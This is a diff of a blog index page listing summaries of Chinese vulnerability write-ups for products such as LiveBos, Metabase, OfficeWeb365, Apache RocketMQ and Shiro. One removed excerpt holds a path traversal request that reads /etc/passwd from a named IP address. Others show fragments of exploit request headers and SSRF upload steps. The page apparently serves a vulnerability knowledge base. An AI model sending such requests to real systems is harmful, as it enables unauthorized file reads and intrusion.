@@ -107,41 +107,41 @@
 <a href="/index.xml" title="RSS" target="_blank" rel="noopener noreffer me"><i class="fas fa-rss fa-fw" aria-hidden="true"></i></a>
 </div></div>
 <article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/livebos-showimage.do-%E6%96%87%E4%BB%B6-imgname-%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/">LiveBos ShowImage.do 文件 imgName 参数读取漏洞</a>
+        <a href="/apache-ofbiz-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-rce/">Apache OfBiz 远程代码执行 RCE</a>
     </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chinchin</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2023-12-08">2023-12-08</time></span>&nbsp;<span class="post-category">included in <a href="/categories/2023hw/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>2023hw</a></span></div><div class="content">## fofa 1 body=&#34;LiveBos&#34; || body=&#34;/react/browser/loginBackground.png&#34; poc 1 2 3 4 5 GET /feed/ShowImage.do;.js.jsp?type=&amp;imgName=../../../../../../../../../../../../../../../etc/passwd HTTP/1.1 Host: 112.35.7.97:8001 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip</div><div class="post-footer">
-        <a href="/livebos-showimage.do-%E6%96%87%E4%BB%B6-imgname-%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/2023hw/">2023hw</a></div></div>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2023-12-08">2023-12-08</time></span>&nbsp;<span class="post-category">included in <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>漏洞知识库</a></span></div><div class="content">Apache OfBiz 远程代码执行 RCE 漏洞描述 Apache OfBiz 17.12.01容易受到服务器端模板注入（SSTI）的影响，从而导致远程代码执行（RCE）。 参考链接： https://securitylab.github.com/advisories/GHSL-2020-066-apache_ofbiz 网络测</div><div class="post-footer">
+        <a href="/apache-ofbiz-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-rce/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/">漏洞知识库</a></div></div>
 </article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/metabase-apisetupvalidate-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">Metabase apisetupvalidate 远程代码执行漏洞</a>
+        <a href="/apache-rocketmq-rce-%E6%BC%8F%E6%B4%9E-cve-2023-33246/">Apache RocketMQ RCE 漏洞 CVE-2023-33246</a>
     </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chinchin</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2023-12-08">2023-12-08</time></span>&nbsp;<span class="post-category">included in <a href="/categories/2023hw/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>2023hw</a></span></div><div class="content">首先 get 访问/api/session/properties 获取 token，然后运行如下 POC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 POST /api/setup/validate HTTP/1.1 Host: Content-Length: 242 Content-Type: application/json Accept-Encoding: gzip { &#34;token&#34;:</div><div class="post-footer">
-        <a href="/metabase-apisetupvalidate-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/2023hw/">2023hw</a></div></div>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2023-12-08">2023-12-08</time></span>&nbsp;<span class="post-category">included in <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>漏洞知识库</a></span></div><div class="content">Apache RocketMQ RCE 漏洞 CVE-2023-33246 漏洞描述 RocketMQ 是阿里巴巴在2012年开发的分布式消息中间件，专为万亿级超大规模的消息处理而设计，具有高吞吐量、低延迟、海量堆积、顺序</div><div class="post-footer">
+        <a href="/apache-rocketmq-rce-%E6%BC%8F%E6%B4%9E-cve-2023-33246/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/">漏洞知识库</a></div></div>
 </article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/metabase-validate-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-38646/">Metabase validate 远程命令执行漏洞（CVE-2023-38646）</a>
+        <a href="/apache-rocketmq-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-37582/">Apache RocketMQ 远程代码执行漏洞 CVE-2023-37582</a>
     </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chinchin</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2023-12-08">2023-12-08</time></span>&nbsp;<span class="post-category">included in <a href="/categories/2023hw%E6%BC%8F%E6%B4%9E/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>2023hw漏洞</a></span></div><div class="content">Metabase validate 远程命令执行漏洞（CVE-2023-38646） 网络测绘 app=“元数据库” /api/session/properties 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 POST /api/setup/validate</div><div class="post-footer">
-        <a href="/metabase-validate-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-38646/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/2023hw%E6%BC%8F%E6%B4%9E/">2023hw漏洞</a></div></div>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2023-12-08">2023-12-08</time></span>&nbsp;<span class="post-category">included in <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>漏洞知识库</a></span></div><div class="content">Apache RocketMQ 远程代码执行漏洞 CVE-2023-37582 漏洞描述 此漏洞是由于 CVE-2023-33246 补丁未修复完全，当 RocketMQ 的NameServer 组件暴露在外网，且缺乏有效的身份认证时，攻击者可以利用</div><div class="post-footer">
+        <a href="/apache-rocketmq-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-37582/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/">漏洞知识库</a></div></div>
 </article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/milesight-vpn-server.js-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/">Milesight VPN server.js 任意文件读取漏洞</a>
+        <a href="/apache-shenyu-dashboarduser-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-37580/">Apache ShenYu dashboardUser 账号密码泄漏漏洞 CVE-2021-37580</a>
     </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chinchin</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2023-12-08">2023-12-08</time></span>&nbsp;<span class="post-category">included in <a href="/categories/2023hw/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>2023hw</a></span></div><div class="content"># Milesight VPN server.js 任意文件读取漏洞 漏洞描述 MilesightVPN 是一款软件，可使 Milesight 产品的 VPN 通道设置过程更加简便，并可通过网络服务器界面监控连接状态。其中存在任意文件读取漏</div><div class="post-footer">
-        <a href="/milesight-vpn-server.js-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/2023hw/">2023hw</a></div></div>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2023-12-08">2023-12-08</time></span>&nbsp;<span class="post-category">included in <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>漏洞知识库</a></span></div><div class="content">Apache ShenYu dashboardUser 账号密码泄漏漏洞 CVE-2021-37580 漏洞描述 Apache ShenYu Admin爆出身份验证绕过漏洞，攻击者可通过该漏洞绕过JSON Web Token (JWT)安全认证，直接进入系统后台。</div><div class="post-footer">
+        <a href="/apache-shenyu-dashboarduser-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-37580/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/">漏洞知识库</a></div></div>
 </article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/minio-verify-%E6%8E%A5%E5%8F%A3%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9Ecve-2023-28432/">MinIO verify 接口敏感信息泄露漏洞（CVE-2023-28432）</a>
+        <a href="/apache-shiro-1.6.0-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2020-13933/">Apache Shiro 1.6.0 身份认证绕过漏洞 CVE-2020-13933</a>
     </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chinchin</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2023-12-08">2023-12-08</time></span>&nbsp;<span class="post-category">included in <a href="/categories/2023hw/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>2023hw</a></span></div><div class="content">## MinIO verify 接口敏感信息泄露漏洞（CVE-2023-28432） 漏洞描述： 1 &lt;span style=\&#34;color: var(--primaryFont-color);\&#34;&gt;MinIO 是一种开源的对象存储服务，它兼容 Amazon S3 API，可以在私有云或公有云</div><div class="post-footer">
-        <a href="/minio-verify-%E6%8E%A5%E5%8F%A3%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9Ecve-2023-28432/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/2023hw/">2023hw</a></div></div>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2023-12-08">2023-12-08</time></span>&nbsp;<span class="post-category">included in <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>漏洞知识库</a></span></div><div class="content">Apache Shiro 1.6.0 身份认证绕过漏洞 CVE-2020-13933 漏洞描述 2020年8月18日，Apache Shiro官方发布安全通告 Apache Shiro身份验证绕过漏洞（CVE-2020-</div><div class="post-footer">
+        <a href="/apache-shiro-1.6.0-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2020-13933/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/">漏洞知识库</a></div></div>
 </article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/officeweb365-furl-ssrf-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">OfficeWeb365 furl SSRF 文件上传漏洞</a>
+        <a href="/apache-shiro-%E5%B0%8F%E4%BA%8E1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2016-4437/">Apache Shiro 小于1.2.4反序列化漏洞 CVE-2016-4437</a>
     </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chinchin</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2023-12-08">2023-12-08</time></span>&nbsp;<span class="post-category">included in <a href="/categories/2023hw/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>2023hw</a></span></div><div class="content">需要提前准备 2 个文件，一个 ashx 和一个 txt 文件 将这两个文件打包为 2.zip，然后起一个 http 服务提供给网站远程下载 然后访问?furl=http://你</div><div class="post-footer">
-        <a href="/officeweb365-furl-ssrf-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/2023hw/">2023hw</a></div></div>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2023-12-08">2023-12-08</time></span>&nbsp;<span class="post-category">included in <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>漏洞知识库</a></span></div><div class="content">Apache Shiro 小于1.2.4反序列化漏洞 CVE-2016-4437 漏洞描述 Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时</div><div class="post-footer">
+        <a href="/apache-shiro-%E5%B0%8F%E4%BA%8E1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2016-4437/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/">漏洞知识库</a></div></div>
 </article><ul class="pagination"><li class="page-item ">
                     <span class="page-link">
                         <a href="/">1</a>
@@ -172,7 +172,7 @@
                     <span class="page-link" aria-hidden="true">&hellip;</span>
                 </li><li class="page-item ">
                     <span class="page-link">
-                        <a href="/page/195/">195</a>
+                        <a href="/page/333/">333</a>
                     </span>
                 </li></ul></div></div>
             </main><footer class="footer">
